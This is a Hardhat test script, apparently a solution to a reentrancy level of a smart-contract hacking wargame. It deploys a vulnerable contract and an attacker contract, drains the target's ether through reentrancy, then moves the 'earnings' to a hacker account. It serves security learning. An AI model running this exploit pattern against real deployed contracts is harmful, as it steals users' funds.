const { expect } = require("chai");
const { ethers } = require("hardhat");
const hre = require("hardhat");
const { consoleLogTitleH1, consoleLogMessage } = require("./utils.js");

describe("Reentrance", function () {
  let deployer;
  let hacker;
  let tester;

  before(async function () {
    consoleLogTitleH1("Level 10 - Re-entrance");

    consoleLogMessage(`💻 Network: ${hre.network.name}`);

    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();
  });

  it("Should withdraw all the ether from Reentrance.sol", async function () {
    let etherInTheContract = "1";
    let etherDonation = "0.3";
    let etherToWithdraw = "0.3";

    // 📗 Contract to be hacked
    const Contract = await ethers.getContractFactory("Reentrance", deployer);
    const contract = await Contract.connect(deployer).deploy();
    await contract.deployed();

    // ✍ Send some ether to the contract for stealing it in the hack
    consoleLogMessage(
      `✍  Sending ${etherInTheContract} ether to the contract...`
    );
    let tx = await deployer.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther(etherInTheContract),
    });
    await tx.wait((confirms = 1));

    // 📕 Deploy the contract that will execute the hack
    const HackContract = await ethers.getContractFactory(
      "HackReentrance",
      hacker
    );
    const hackContract = await HackContract.connect(hacker).deploy(
      contract.address
    );
    await hackContract.deployed();

    // 👉 Example of normal usage
    if (false) {
      // ✍ Donate some ether as a normal user would do
      consoleLogMessage(`✍  Donating ${etherDonation} ether to a user ...`);
      tx = await contract.connect(hacker).donate(hacker.address, {
        value: ethers.utils.parseEther(etherDonation),
      });
      await tx.wait((confirms = 1));

      // 😊 Withdraw donation without reentrance - normal usage of the contract
      tx = await contract
        .connect(hacker)
        .withdraw(ethers.utils.parseEther(etherToWithdraw));
      await tx.wait((confirms = 1));
    }

    // 👿 Donate some ether to our HackContract to prepare the hack
    consoleLogMessage(
      `✍  Donating ${etherToWithdraw} ether to the HackContract...`
    );
    tx = await contract.connect(hacker).donate(hackContract.address, {
      value: ethers.utils.parseEther(etherToWithdraw),
    });
    await tx.wait((confirms = 1));

    let contractBalance = (
      await ethers.provider.getBalance(contract.address)
    ).toString();

    // 👿 Hacking the contract
    consoleLogMessage("👿 Hacking the contract...");
    tx = await hackContract.connect(hacker).withdrawDonation(
      ethers.utils.parseEther(etherToWithdraw, {
        gasLimit: 1000000,
      })
    );
    tx = await tx.wait((confirms = 1));
    consoleLogMessage("👿 Hack hash\n");
    consoleLogMessage(tx);
    consoleLogMessage("\n");

    // ✅ Check if the hack was successful
    consoleLogMessage("✅ Checking if the hack was successful...");
    let hackContractBalance = (
      await ethers.provider.getBalance(hackContract.address)
    ).toString();

    expect(hackContractBalance).to.be.eq(contractBalance);

    // 👿 Retrieving our earnings to the hacker account
    tx = await hackContract.connect(hacker).withdrawHackEarnings();
    tx = await tx.wait((confirms = 1));
    consoleLogMessage("👿 Hack finished\n");
  });
});
